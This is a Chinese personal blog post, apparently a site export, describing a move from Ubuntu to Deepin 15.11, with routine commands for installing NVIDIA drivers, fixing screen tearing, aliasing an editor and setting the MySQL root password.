Deepin15.11初体验及问题解决\nsubtitle:   专治各种小毛病。\ndate:       2019-10-03\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Linux\n---\n\n> Deepin发展也有不少年了，最近还和华为的笔记本合作预装。之前我一直都用Ubuntu做日常开发，现在心血来潮也想折腾一下Deepin哈哈，\n> 本文主要讲从Ubuntu无痛迁移到Deepin的安装过程、N卡显卡驱动等一系列小坑的解决。权当总结吧！\n\n### 下载和制作启动盘\n\n这个就不讲了哈，直接在官网下就行了，包括启动盘制作工具。\n[http://www.deepin.org/download/](http://www.deepin.org/download/)\n\n### 保留数据从Ubuntu迁移到Deepin操作系统\n\n先说一下我的Ubuntu分区挂载情况：我单独挂载了/home和/efi，除此之外都分给了/，平时的重要文件都在home里面，这样在装其他Linux时也方便。\n\n进入Deepin的安装分区步骤时：\n\n- 依然挂载/home到原来的/home上面，且**千万不要选择格式化**；\n- 然后由于我之前的Ubuntu就是UEFI启动方式，所以同样挂载/efi覆盖原来的，这个可以格式化；\n- 最后剩余空间挂载/，并选择格式化，界面上还会提示你Deepin会安装到这里。\n\n**重点：** 在填用户名时一定要和之前Ubuntu的不一样，这样你之前的数据就能保留，安装成功后可以直接copy过来。\n安装完之后记得拔掉U盘，改一下启动顺序。\n\n### 老大难N卡显卡驱动\n\nLinux发行版最头疼的就是驱动问题了，什么闭源驱动开源驱动很多新同学不知道是什么。闭源就是NVIDIA官方的驱动，开源就是热心~~基佬~~网友搞的驱动，一般来说不如闭源的好，官方的肯定兼容性是最好的。\n\n其实大家会发现Deepin有一个显卡驱动管理器，看起来可以切换各种驱动：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135452320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n我的Deepin版本是截至目前最新的15.11，但是这里面的闭源驱动版本却只有390，如果是RTX20系列的显卡，估计不支持的，至少我这个2070，选了这个“使用闭源驱动”重启后没有任何作用，分辨率依然还是1024。\n其余两个选项我也试过了，均不起作用，没办法，只能去NVIDIA官方下载驱动了。\n\n官方闭源驱动安装步骤：\n\n1. 先去官网下载对应显卡的Linux驱动：[https://www.geforce.cn/drivers](https://www.geforce.cn/drivers)，下载后是一个.run文件；\n\n2. 老套路，禁用开源驱动，编辑黑名单文件：\n\n   ```bash\n   # Deepin默认的编辑器是deepin-editor\n   # 我这个有个bcm43什么的，不一定都是这个，反正是blacklistxxx.conf\n   sudo deepin-editor /etc/modprobe.d/blacklist-bcm43.conf\n   ```\n\n3. 在文件末尾加入：\n\n   ```bash\n   blacklist nouveau\n   blacklist lbm-nouveau\n   options nouveau modeset=0\n   alias nouveau off\n   alias lbm-nouveau off\n   ```\n\n4. 刷新一下直接重启吧：\n\n   ```bash\n   # 如果之前自己用apt安装了NVIDIA驱动，也最好卸载，否则后面会失败\n   sudo apt autoremove --purge nvidia*\n   # 刷新重启\n   sudo update-initramfs -u\n   reboot\n   ```\n\n5. 重启完了之后按**Ctrl + Alt + F2**进入命令模式，然后：\n\n   ```bash\n   # 关闭图形界面\n   sudo service lightdm stop\n   sudo init 3\n   ```\n\n6. 给你刚才下载好的.run驱动程序赋予执行权限，就可以执行安装了：\n\n   ```bash\n   sudo chmod a+x  ～/Downloads/NVIDIA-Linux-x86_64-430.40.run\n   reboot\n   ```\n\n   安装过程中各种提示，能选是就是，若有提示覆盖安装（Override write之类的），那就选覆盖安装。\n   装完重启大功告成！\n\n### 解决画面撕裂问题\n\n安装好N卡驱动重启后，分辨率就正常了，美滋滋。但我发现一个很不爽的问题就是快速拖动窗口和浏览滚动网页时，会有明显的画面撕裂。猜测是没有开启垂直同步导致丢帧，但是一想我在Ubuntu上面没有问题啊。多半还是驱动问题。\n这里提供一个解决办法：\n\n1. 打开你的NVIDIA X Server Settings，即控制面板，选择左边第2个Display Configuration：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135555818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n3. 点右边的Advanced展开高级选项，把第二个勾上：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135702221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n4. 最后点Save to X那个就行了。然后记得重启系统。\n\n### 简化编辑器命令\n\n习惯了Ubuntu的gedit的同学会发现Deepin里面没有这个东西，每次输入sudo deepin-editor也太麻烦了，我们可以用alias简化一下：\n\n1. 先打开.bashrc文件：\n\n   ```bash\n   sudo deepin-editor ~/.bashrc\n   ```\n\n2. 追加内容：\n\n   ```bash\n   alias sudo='sudo '\n   alias gedit=deepin-editor\n   ```\n\n3. 保存后刷新一下：\n\n   ```bash\n   source ~/.bashrc\n   # 然后我们就可以这样来打开文件了：\n   sudo gedit xxx.txt\n   ```\n\n### 关于MySQL安装后不知道密码的问题\n\n在Deepin上安装东西还是很方便的，大部分软件都不需要再添加私有源了。\n\n```bash\nsudo apt-get install mysql-server mysql-client\n```\n\n安装MySQL成功后会发现并没有提示设置密码，也没告诉你初始密码。这时候可以先免密登录：\n\n```bash\nsudo mysql -uroot\n```\n\n进入mysql后两步操作给root用户设置密码：\n\n```bash\nupdate mysql.user set plugin=“mysql_native_password” where user=“root”;\nupdate mysql.user set authentication_string=password(‘你的密码，只用改这个地方’) where user='root’and Host = ‘localhost’;\n```\n\n退出后重启一下服务：\n\n```bash\nsudo service mysql restart\n# 然后就可以正常登录了\nmysql -uroot -p\n```\n\n### 搜狗输入法登录问题\n\n如果是QQ号登录，输入账号密码登录貌似不行，用手机QQ扫码登录就可以了。\n\n### 标题栏太高怎么办\n\n[Deepin标题栏太高的解决办法（自定义高度）](https://blog.ysy950803.top/2019/10/10/Deepin%E6%A0%87%E9%A2%98%E6%A0%8F%E5%A4%AA%E9%AB%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AB%98%E5%BA%A6/)\n\n### add-apt-repository失败问题\n\n[Deepin系统add-apt-repository失败的问题](https://blog.ysy950803.top/2019/10/28/Deepin%E7%B3%BB%E7%BB%9Fadd-apt-repository%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/)\n\n### 吐槽\n\n**优点**\n总的说来，Deepin还是很漂亮的，而且应用商店里的东西也非常丰富，一键安装，省去不少麻烦。除了显卡驱动要自己弄，其他硬件我觉得支持得都非常好，我的破台式显示器居然可以在控制中心里调亮度，在Ubuntu上就不行。真的是一个让Linux走近千万家的系统。\n就流畅性而言，也没有感到和Ubuntu有什么差距，只是刚换过来，有一些操作习惯可能会有些许不同，适应几天就顺手了。\n\n**槽点**\n以目前这个版本（15.11）来说，我最大的槽点应该就是标题栏了，实在太粗了，最大化之后一个标题栏就要占两行代码的位置，而且不能自定义高度，希望后续版本有改进。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191003135612820.png)\n还有deepin-wine版微信每次重新启动后不能保存上一次的自定义窗口大小，在Ubuntu上都不会这样。\n酸酸乳PAC模式在Deepin上好像有问题，我发现先开全局模式再开PAC就能解决。\n\n### 最后\n\n相比Ubuntu，Deepin还是有很多不同和亮点的，后面如果再想到什么再追加吧。\n","slug":"Deepin15.11初体验及问题解决","published":1,"updated":"2024-03-25T07:31:25.856Z","comments":1,"photos":[],"link":"","_id":"cluaufh0p001dthe62idghfov","content":"<blockquote>\n<p>Deepin发展也有不少年了，最近还和华为的笔记本合作预装。之前我一直都用Ubuntu做日常开发，现在心血来潮也想折腾一下Deepin哈哈，<br>本文主要讲从Ubuntu无痛迁移到Deepin的安装过程、N卡显卡驱动等一系列小坑的解决。权当总结吧！</p>\n</blockquote>\n<h3 id=\"下载和制作启动盘\"><a href=\"#下载和制作启动盘\" class=\"headerlink\" title=\"下载和制作启动盘\"></a>下载和制作启动盘</h3><p>这个就不讲了哈，直接在官网下就行了，包括启动盘制作工具。<br><a href=\"http://www.deepin.org/download/\">http://www.deepin.org/download/</a></p>\n<h3 id=\"保留数据从Ubuntu迁移到Deepin操作系统\"><a href=\"#保留数据从Ubuntu迁移到Deepin操作系统\" class=\"headerlink\" title=\"保留数据从Ubuntu迁移到Deepin操作系统\"></a>保留数据从Ubuntu迁移到Deepin操作系统</h3><p>先说一下我的Ubuntu分区挂载情况：我单独挂载了&#x2F;home和&#x2F;efi，除此之外都分给了&#x2F;，平时的重要文件都在home里面，这样在装其他Linux时也方便。</p>\n<p>进入Deepin的安装分区步骤时：</p>\n<ul>\n<li>依然挂载&#x2F;home到原来的&#x2F;home上面，且<strong>千万不要选择格式化</strong>；</li>\n<li>然后由于我之前的Ubuntu就是UEFI启动方式，所以同样挂载&#x2F;efi覆盖原来的，这个可以格式化；</li>\n<li>最后剩余空间挂载&#x2F;，并选择格式化，界面上还会提示你Deepin会安装到这里。</li>\n</ul>\n<p><strong>重点：</strong> 在填用户名时一定要和之前Ubuntu的不一样，这样你之前的数据就能保留，安装成功后可以直接copy过来。<br>安装完之后记得拔掉U盘，改一下启动顺序。</p>\n<h3 id=\"老大难N卡显卡驱动\"><a href=\"#老大难N卡显卡驱动\" class=\"headerlink\" title=\"老大难N卡显卡驱动\"></a>老大难N卡显卡驱动</h3><p>Linux发行版最头疼的就是驱动问题了，什么闭源驱动开源驱动很多新同学不知道是什么。闭源就是NVIDIA官方的驱动，开源就是热心<del>基佬</del>网友搞的驱动，一般来说不如闭源的好，官方的肯定兼容性是最好的。</p>\n<p>其实大家会发现Deepin有一个显卡驱动管理器，看起来可以切换各种驱动：<br><img src=\"https://imgconvert.csdnimg.cn/20191003135452320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>我的Deepin版本是截至目前最新的15.11，但是这里面的闭源驱动版本却只有390，如果是RTX20系列的显卡，估计不支持的，至少我这个2070，选了这个“使用闭源驱动”重启后没有任何作用，分辨率依然还是1024。<br>其余两个选项我也试过了，均不起作用，没办法，只能去NVIDIA官方下载驱动了。</p>\n<p>官方闭源驱动安装步骤：</p>\n<ol>\n<li><p>先去官网下载对应显卡的Linux驱动：<a href=\"https://www.geforce.cn/drivers\">https://www.geforce.cn/drivers</a>，下载后是一个.run文件；</p>\n</li>\n<li><p>老套路，禁用开源驱动，编辑黑名单文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deepin默认的编辑器是deepin-editor</span></span><br><span class=\"line\"><span class=\"comment\"># 我这个有个bcm43什么的，不一定都是这个，反正是blacklistxxx.conf</span></span><br><span class=\"line\">sudo deepin-editor /etc/modprobe.d/blacklist-bcm43.conf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在文件末尾加入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">blacklist nouveau</span><br><span class=\"line\">blacklist lbm-nouveau</span><br><span class=\"line\">options nouveau modeset=0</span><br><span class=\"line\"><span class=\"built_in\">alias</span> nouveau off</span><br><span class=\"line\"><span class=\"built_in\">alias</span> lbm-nouveau off</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>刷新一下直接重启吧：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 如果之前自己用apt安装了NVIDIA驱动，也最好卸载，否则后面会失败</span></span><br><span class=\"line\">sudo apt autoremove --purge nvidia*</span><br><span class=\"line\"><span class=\"comment\"># 刷新重启</span></span><br><span class=\"line\">sudo update-initramfs -u</span><br><span class=\"line\">reboot</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启完了之后按<strong>Ctrl + Alt + F2</strong>进入命令模式，然后：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭图形界面</span></span><br><span class=\"line\">sudo service lightdm stop</span><br><span class=\"line\">sudo init 3</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>给你刚才下载好的.run驱动程序赋予执行权限，就可以执行安装了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">chmod</span> a+x  ～/Downloads/NVIDIA-Linux-x86_64-430.40.run</span><br><span class=\"line\">reboot</span><br></pre></td></tr></table></figure>\n\n<p>安装过程中各种提示，能选是就是，若有提示覆盖安装（Override write之类的），那就选覆盖安装。<br>装完重启大功告成！</p>\n</li>\n</ol>\n<h3 id=\"解决画面撕裂问题\"><a href=\"#解决画面撕裂问题\" class=\"headerlink\" title=\"解决画面撕裂问题\"></a>解决画面撕裂问题</h3><p>安装好N卡驱动重启后，分辨率就正常了，美滋滋。但我发现一个很不爽的问题就是快速拖动窗口和浏览滚动网页时，会有明显的画面撕裂。猜测是没有开启垂直同步导致丢帧，但是一想我在Ubuntu上面没有问题啊。多半还是驱动问题。<br>这里提供一个解决办法：</p>\n<ol>\n<li>打开你的NVIDIA X Server Settings，即控制面板，选择左边第2个Display Configuration：<br><img src=\"https://imgconvert.csdnimg.cn/20191003135555818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n<li>点右边的Advanced展开高级选项，把第二个勾上：<br><img src=\"https://imgconvert.csdnimg.cn/20191003135702221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n<li>最后点Save to X那个就行了。然后记得重启系统。</li>\n</ol>\n<h3 id=\"简化编辑器命令\"><a href=\"#简化编辑器命令\" class=\"headerlink\" title=\"简化编辑器命令\"></a>简化编辑器命令</h3><p>习惯了Ubuntu的gedit的同学会发现Deepin里面没有这个东西，每次输入sudo deepin-editor也太麻烦了，我们可以用alias简化一下：</p>\n<ol>\n<li><p>先打开.bashrc文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo deepin-editor ~/.bashrc</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>追加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">alias</span> sudo=<span class=\"string\">&#x27;sudo &#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">alias</span> gedit=deepin-editor</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>保存后刷新一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br><span class=\"line\"><span class=\"comment\"># 然后我们就可以这样来打开文件了：</span></span><br><span class=\"line\">sudo gedit xxx.txt</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"关于MySQL安装后不知道密码的问题\"><a href=\"#关于MySQL安装后不知道密码的问题\" class=\"headerlink\" title=\"关于MySQL安装后不知道密码的问题\"></a>关于MySQL安装后不知道密码的问题</h3><p>在Deepin上安装东西还是很方便的，大部分软件都不需要再添加私有源了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure>\n\n<p>安装MySQL成功后会发现并没有提示设置密码，也没告诉你初始密码。这时候可以先免密登录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mysql -uroot</span><br></pre></td></tr></table></figure>\n\n<p>进入mysql后两步操作给root用户设置密码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update mysql.user <span class=\"built_in\">set</span> plugin=“mysql_native_password” <span class=\"built_in\">where</span> user=“root”;</span><br><span class=\"line\">update mysql.user <span class=\"built_in\">set</span> authentication_string=password(‘你的密码，只用改这个地方’) <span class=\"built_in\">where</span> user=<span class=\"string\">&#x27;root’and Host = ‘localhost’;</span></span><br></pre></td></tr></table></figure>\n\n<p>退出后重启一下服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service mysql restart</span><br><span class=\"line\"><span class=\"comment\"># 然后就可以正常登录了</span></span><br><span class=\"line\">mysql -uroot -p</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"搜狗输入法登录问题\"><a href=\"#搜狗输入法登录问题\" class=\"headerlink\" title=\"搜狗输入法登录问题\"></a>搜狗输入法登录问题</h3><p>如果是QQ号登录，输入账号密码登录貌似不行，用手机QQ扫码登录就可以了。</p>\n<h3 id=\"标题栏太高怎么办\"><a href=\"#标题栏太高怎么办\" class=\"headerlink\" title=\"标题栏太高怎么办\"></a>标题栏太高怎么办</h3><p><a href=\"https://blog.ysy950803.top/2019/10/10/Deepin%E6%A0%87%E9%A2%98%E6%A0%8F%E5%A4%AA%E9%AB%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AB%98%E5%BA%A6/\">Deepin标题栏太高的解决办法（自定义高度）</a></p>\n<h3 id=\"add-apt-repository失败问题\"><a href=\"#add-apt-repository失败问题\" class=\"headerlink\" title=\"add-apt-repository失败问题\"></a>add-apt-repository失败问题</h3><p><a href=\"https://blog.ysy950803.top/2019/10/28/Deepin%E7%B3%BB%E7%BB%9Fadd-apt-repository%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">Deepin系统add-apt-repository失败的问题</a></p>\n<h3 id=\"吐槽\"><a href=\"#吐槽\" class=\"headerlink\" title=\"吐槽\"></a>吐槽</h3><p><strong>优点</strong><br>总的说来，Deepin还是很漂亮的，而且应用商店里的东西也非常丰富，一键安装，省去不少麻烦。除了显卡驱动要自己弄，其他硬件我觉得支持得都非常好，我的破台式显示器居然可以在控制中心里调亮度，在Ubuntu上就不行。真的是一个让Linux走近千万家的系统。<br>就流畅性而言，也没有感到和Ubuntu有什么差距，只是刚换过来，有一些操作习惯可能会有些许不同，适应几天就顺手了。</p>\n<p><strong>槽点</strong><br>以目前这个版本（15.11）来说，我最大的槽点应该就是标题栏了，实在太粗了，最大化之后一个标题栏就要占两行代码的位置，而且不能自定义高度，希望后续版本有改进。<br><img src=\"https://imgconvert.csdnimg.cn/20191003135612820.png\" alt=\"在这里插入图片描述\"><br>还有deepin-wine版微信每次重新启动后不能保存上一次的自定义窗口大小，在Ubuntu上都不会这样。<br>酸酸乳PAC模式在Deepin上好像有问题，我发现先开全局模式再开PAC就能解决。</p>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><p>相比Ubuntu，Deepin还是有很多不同和亮点的，后面如果再想到什么再追加吧。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>Deepin发展也有不少年了，最近还和华为的笔记本合作预装。之前我一直都用Ubuntu做日常开发，现在心血来潮也想折腾一下Deepin哈哈，<br>本文主要讲从Ubuntu无痛迁移到Deepin的安装过程、N卡显卡驱动等一系列小坑的解决。权当总结吧！</p>\n</blockquote>\n<h3 id=\"下载和制作启动盘\"><a href=\"#下载和制作启动盘\" class=\"headerlink\" title=\"下载和制作启动盘\"></a>下载和制作启动盘</h3><p>这个就不讲了哈，直接在官网下就行了，包括启动盘制作工具。<br><a href=\"http://www.deepin.org/download/\">http://www.deepin.org/download/</a></p>\n<h3 id=\"保留数据从Ubuntu迁移到Deepin操作系统\"><a href=\"#保留数据从Ubuntu迁移到Deepin操作系统\" class=\"headerlink\" title=\"保留数据从Ubuntu迁移到Deepin操作系统\"></a>保留数据从Ubuntu迁移到Deepin操作系统</h3><p>先说一下我的Ubuntu分区挂载情况：我单独挂载了&#x2F;home和&#x2F;efi，除此之外都分给了&#x2F;，平时的重要文件都在home里面，这样在装其他Linux时也方便。</p>\n<p>进入Deepin的安装分区步骤时：</p>\n<ul>\n<li>依然挂载&#x2F;home到原来的&#x2F;home上面，且<strong>千万不要选择格式化</strong>；</li>\n<li>然后由于我之前的Ubuntu就是UEFI启动方式，所以同样挂载&#x2F;efi覆盖原来的，这个可以格式化；</li>\n<li>最后剩余空间挂载&#x2F;，并选择格式化，界面上还会提示你Deepin会安装到这里。</li>\n</ul>\n<p><strong>重点：</strong> 在填用户名时一定要和之前Ubuntu的不一样，这样你之前的数据就能保留，安装成功后可以直接copy过来。<br>安装完之后记得拔掉U盘，改一下启动顺序。</p>\n<h3 id=\"老大难N卡显卡驱动\"><a href=\"#老大难N卡显卡驱动\" class=\"headerlink\" title=\"老大难N卡显卡驱动\"></a>老大难N卡显卡驱动</h3><p>Linux发行版最头疼的就是驱动问题了，什么闭源驱动开源驱动很多新同学不知道是什么。闭源就是NVIDIA官方的驱动，开源就是热心<del>基佬</del>网友搞的驱动，一般来说不如闭源的好，官方的肯定兼容性是最好的。</p>\n<p>其实大家会发现Deepin有一个显卡驱动管理器，看起来可以切换各种驱动：<br><img src=\"https://imgconvert.csdnimg.cn/20191003135452320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>我的Deepin版本是截至目前最新的15.11，但是这里面的闭源驱动版本却只有390，如果是RTX20系列的显卡，估计不支持的，至少我这个2070，选了这个“使用闭源驱动”重启后没有任何作用，分辨率依然还是1024。<br>其余两个选项我也试过了，均不起作用，没办法，只能去NVIDIA官方下载驱动了。</p>\n<p>官方闭源驱动安装步骤：</p>\n<ol>\n<li><p>先去官网下载对应显卡的Linux驱动：<a href=\"https://www.geforce.cn/drivers\">https://www.geforce.cn/drivers</a>，下载后是一个.run文件；</p>\n</li>\n<li><p>老套路，禁用开源驱动，编辑黑名单文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deepin默认的编辑器是deepin-editor</span></span><br><span class=\"line\"><span class=\"comment\"># 我这个有个bcm43什么的，不一定都是这个，反正是blacklistxxx.conf</span></span><br><span class=\"line\">sudo deepin-editor /etc/modprobe.d/blacklist-bcm43.conf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在文件末尾加入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">blacklist nouveau</span><br><span class=\"line\">blacklist lbm-nouveau</span><br><span class=\"line\">options nouveau modeset=0</span><br><span class=\"line\"><span class=\"built_in\">alias</span> nouveau off</span><br><span class=\"line\"><span class=\"built_in\">alias</span> lbm-nouveau off</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>刷新一下直接重启吧：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 如果之前自己用apt安装了NVIDIA驱动，也最好卸载，否则后面会失败</span></span><br><span class=\"line\">sudo apt autoremove --purge nvidia*</span><br><span class=\"line\"><span class=\"comment\"># 刷新重启</span></span><br><span class=\"line\">sudo update-initramfs -u</span><br><span class=\"line\">reboot</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启完了之后按<strong>Ctrl + Alt + F2</strong>进入命令模式，然后：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭图形界面</span></span><br><span class=\"line\">sudo service lightdm stop</span><br><span class=\"line\">sudo init 3</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>给你刚才下载好的.run驱动程序赋予执行权限，就可以执行安装了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">chmod</span> a+x  ～/Downloads/NVIDIA-Linux-x86_64-430.40.run</span><br><span class=\"line\">reboot</span><br></pre></td></tr></table></figure>\n\n<p>安装过程中各种提示，能选是就是，若有提示覆盖安装（Override write之类的），那就选覆盖安装。<br>装完重启大功告成！</p>\n</li>\n</ol>\n<h3 id=\"解决画面撕裂问题\"><a href=\"#解决画面撕裂问题\" class=\"headerlink\" title=\"解决画面撕裂问题\"></a>解决画面撕裂问题</h3><p>安装好N卡驱动重启后，分辨率就正常了，美滋滋。但我发现一个很不爽的问题就是快速拖动窗口和浏览滚动网页时，会有明显的画面撕裂。猜测是没有开启垂直同步导致丢帧，但是一想我在Ubuntu上面没有问题啊。多半还是驱动问题。<br>这里提供一个解决办法：</p>\n<ol>\n<li>打开你的NVIDIA X Server Settings，即控制面板，选择左边第2个Display Configuration：<br><img src=\"https://imgconvert.csdnimg.cn/20191003135555818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n<li>点右边的Advanced展开高级选项，把第二个勾上：<br><img src=\"https://imgconvert.csdnimg.cn/20191003135702221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></li>\n<li>最后点Save to X那个就行了。然后记得重启系统。</li>\n</ol>\n<h3 id=\"简化编辑器命令\"><a href=\"#简化编辑器命令\" class=\"headerlink\" title=\"简化编辑器命令\"></a>简化编辑器命令</h3><p>习惯了Ubuntu的gedit的同学会发现Deepin里面没有这个东西，每次输入sudo deepin-editor也太麻烦了，我们可以用alias简化一下：</p>\n<ol>\n<li><p>先打开.bashrc文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo deepin-editor ~/.bashrc</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>追加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">alias</span> sudo=<span class=\"string\">&#x27;sudo &#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">alias</span> gedit=deepin-editor</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>保存后刷新一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td 